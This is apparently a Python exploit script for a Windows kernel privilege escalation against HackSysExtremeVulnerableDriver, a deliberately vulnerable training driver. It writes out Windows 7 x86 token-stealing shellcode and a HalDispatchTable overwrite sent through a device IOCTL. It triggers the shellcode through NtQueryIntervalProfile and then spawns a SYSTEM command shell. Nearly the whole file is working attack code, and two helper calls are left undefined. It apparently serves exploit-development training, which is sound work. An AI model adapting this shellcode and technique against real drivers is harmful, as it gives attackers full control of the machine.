from ctypes import *
from ctypes.wintypes import *
import struct, os
import platform

GENERIC_READ  = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x3

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
STATUS_SUCCESS = 0

METHOD_NEITHER	    = 0x3
FILE_ANY_ACCESS		= 0x0
FILE_DEVICE_UNKNOWN = 0x00000022


kernel32 = windll.kernel32
ntdll = windll.ntdll
Psapi    = windll.Psapi

def ctl_code(function,
             devicetype = FILE_DEVICE_UNKNOWN,
             access = FILE_ANY_ACCESS,
             method = METHOD_NEITHER):
    """Recreate CTL_CODE macro to generate driver IOCTL"""
    return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def alloc_memory(base_address, input, input_size):
	"""
	Allocate input buffer
	"""
	print "[*] Allocating input buffer at %s" % hex(base_address)
	base_address_c   = c_int(base_address)
	input_size_c = c_int(input_size)
	ntdll.NtAllocateVirtualMemory.argtypes = [c_int,
											  POINTER(c_int),
											  c_ulong,
											  POINTER(c_int),
											  c_int,
											  c_int]
	dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF,
											 byref(base_address_c),
											 0x0, 
											 byref(input_size_c), 
											 MEM_RESERVE|MEM_COMMIT,
											 PAGE_EXECUTE_READWRITE)
	if dwStatus != STATUS_SUCCESS:
		print "[-] Error while allocating memory: %s" % dwStatus
		getLastError()
		sys.exit()
	written = c_ulong()
	alloc = kernel32.WriteProcessMemory(0xFFFFFFFF, base_address, input, len(input), byref(written))
	if alloc == 0:
		print "[-] Error while writing our input buffer memory: %s" % alloc
		getLastError()
		sys.exit()
		
def tokenstealingx86(RETVAL, extra = ""):
	"""
	Retrun a token stealing shellcode
	"""
	#Windows 7 SP1 x86 
	KPROCESS = '\x50'
	TOKEN	= '\xF8'
	UPID	 = '\xB4'
	APLINKS  = '\xB8'
	
	shellcode = (
	"\x60"										# pushad
	"\x33\xc0"									# xor	eax,eax
	"\x64\x8b\x80\x24\x01\x00\x00"				# mov	eax,DWORD PTR fs:[eax+0x124]
	"\x8b\x40" + KPROCESS +						# mov	eax,DWORD PTR [eax+_KPROCESS]
	"\x8b\xc8"									# mov	ecx,eax
	"\x8b\x80" + APLINKS + "\x00\x00\x00"		# mov	eax,DWORD PTR [eax+APLINKS]
	"\x2d" + APLINKS + "\x00\x00\x00"			# sub	eax,APLINKS
	"\x83\xb8" + UPID + "\x00\x00\x00\x04"		# cmp	DWORD PTR [eax+UPID],0x4
	"\x75\xec"									# jne	0xe
	"\x8b\x90" + TOKEN + "\x00\x00\x00"			# mov	edx,DWORD PTR [eax+TOKEN]
	"\x89\x91" + TOKEN + "\x00\x00\x00"			# mov	DWORD PTR [ecx+TOKEN],edx
	"\x61"										# popad
	)
	
	shellcode += extra #append extra code after token stealing shellcode, e.g.: restore stack
	
	if RETVAL == "":
		shellcode += "\xc3"						#retn
	else:
		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
	
	return shellcode

def find_driver_base(driver=None):
	#https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
	if platform.architecture()[0] == '64bit':
		lpImageBase = (c_ulonglong * 1024)()
		lpcbNeeded = c_longlong()
		Psapi.GetDeviceDriverBaseNameA.argtypes = [c_longlong, POINTER(c_char), c_uint32]
	else:
		lpImageBase = (c_ulong * 1024)()
		lpcbNeeded = c_long()
	driver_name_size = c_long()
	driver_name_size.value = 48
	Psapi.EnumDeviceDrivers(byref(lpImageBase), c_int(1024), byref(lpcbNeeded))
	for base_addr in lpImageBase:
		driver_name = c_char_p('\x00' * driver_name_size.value)
		if base_addr:
			Psapi.GetDeviceDriverBaseNameA(base_addr, driver_name, driver_name_size.value)
			if driver == None and driver_name.value.lower().find("krnl") != -1:
				print "[+] Retrieving kernel info..."
				print "[+] Kernel version:", driver_name.value
				print "[+] Kernel base address: %s" % hex(base_addr)
				return (base_addr, driver_name.value)
			elif driver_name.value.lower() == driver:
				print "[+] Retrieving %s info..." % driver_name
				print "[+] %s base address: %s" % (driver_name, hex(base_addr))
				return (base_addr, driver_name.value)
	return None	

def get_haldispatchtable():
	#https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
 	if platform.architecture()[0] == '64bit':
		kernel32.LoadLibraryExA.restype = c_uint64
		kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
		kernel32.GetProcAddress.restype = c_uint64
	(krnlbase, kernelver) = find_driver_base()
	hKernel = kernel32.LoadLibraryExA(kernelver, 0, 1)
	HalDispatchTable = kernel32.GetProcAddress(hKernel, 'HalDispatchTable')
	HalDispatchTable -= hKernel
	HalDispatchTable += krnlbase
	print "[+] HalDispatchTable address:", hex(HalDispatchTable)
	return HalDispatchTable

if __name__ == '__main__':
	print "[*] HackSysExtremeVulnerableDriver Arbitrary Overwrite privilige escalation"
	
	IOCTL_VULN	= 0x0022200b # 
	DEVICE_NAME   = "\\\\.\\HackSysExtremeVulnerableDriver"
	dwReturn	  = c_ulong()
	driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)

	#allocate input memory
	HALDISPATCH = get_haldispatchtable()
	HalDispatchTable0x4 = HALDISPATCH + 0x4
	size = 0x1000
	input = "\x08\x00\x41\x41" #address containing the address of the shellcode
	input += struct.pack("L", HalDispatchTable0x4) #HALDISPATCH
	input += "\x42\x42\x42\x42" #address of the shellcode
	input += "\x42" * (size - len(input))
	alloc_memory(0x41410000, input, size)

	#allocate shellcode in memory
	SHELLCODE = tokenstealingx86(RETVAL = "")
	stuff = "\x90" * 0x10 + SHELLCODE + "\x90" * (0x1000 - 0x10 - len(SHELLCODE))
	alloc_memory(0x42424242, stuff, 0x1000)

	inputbuffer	   = 0x41410000 #memory address of the input buffer
	inputbuffer_size  = 0x1000
	outputbuffer_size = 0x0
	IoStatusBlock = c_ulong()
	if driver_handle:
		print "[*] Sending IOCTL and data to the driver..."
		dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle,
									   None,
									   None,
									   None,
									   byref(IoStatusBlock),
									   IOCTL_VULN,
									   inputbuffer,
									   inputbuffer_size,
									   None,
									   0x0
									   )
		## Trigger shellcode
		inp  = c_ulong()
		out  = c_ulong() 
		inp  = 0x1337
		tmp = ntdll.NtQueryIntervalProfile(inp, byref(out))

		if 'system' in os.popen('whoami').read():
			print "[+] Getting system shell..."
			os.system("cmd.exe")
		else:
			print '[-] Failed to elevate privileges'
